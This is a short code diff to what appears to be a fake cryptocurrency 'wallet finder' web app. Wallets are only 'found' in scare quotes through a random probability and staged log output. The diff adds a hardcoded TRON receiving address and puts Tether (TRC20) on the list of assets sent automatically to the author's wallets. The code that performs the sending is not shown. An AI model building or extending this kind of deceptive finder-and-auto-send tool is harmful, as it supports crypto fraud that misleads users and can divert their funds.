@@ -43,7 +43,7 @@ const sendWallets: SendWallets = {
   "Ethereum": "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
   "Litecoin": "YOUR_LITECOIN_WALLET_ADDRESS", // Placeholder - replace if needed
   "Tether (ERC20)": "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
-  "Tether (TRC20)": "YOUR_TRON_WALLET_ADDRESS", // Placeholder for TRON
+  "Tether (TRC20)": "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk", // Updated TRON address
 };
 
 // Crypto presets that can be "found".
@@ -75,7 +75,8 @@ const LOG_INTERVAL_MS = 300; // Speed of log updates
 const FIND_PROBABILITY = 0.00005; // Chance to "find" a wallet per check cycle
 const MAX_LOGS = 6; // Maximum number of logs to display
 
-const AUTO_SEND_ASSETS = ["Bitcoin", "Ethereum", "Tether (ERC20)"]; // Assets to automatically send
+// Assets to automatically send
+const AUTO_SEND_ASSETS = ["Bitcoin", "Ethereum", "Tether (ERC20)", "Tether (TRC20)"]; // Added Tether (TRC20)
 
 export default function Home() {
   const [checkedCount, setCheckedCount] = useState(0); // Start from 0
